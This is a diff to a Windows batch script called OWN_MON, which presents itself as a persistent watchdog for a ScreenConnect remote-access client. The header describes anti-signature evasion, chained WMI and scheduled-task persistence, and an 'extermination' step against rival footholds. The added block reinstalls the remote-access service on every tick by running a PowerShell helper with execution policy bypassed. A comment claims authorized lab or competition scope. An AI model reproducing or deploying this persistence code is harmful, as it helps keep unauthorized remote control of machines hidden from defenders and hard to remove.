@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M16
+rem  OWN_MON  BUILD 20260802M17
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -217,6 +217,12 @@ if not errorlevel 1 (
     sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
     if errorlevel 1 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
   )
+)
+rem M17: ALT service entry deleted but product registered -> repair-by-GUID every tick
+sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
+if errorlevel 1 (
+  echo alt_missing_try_repair>>"%LOG%"
+  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
 )
 rem (extermination already ran pre-heal in [E]; foreign survivors counted there)
 
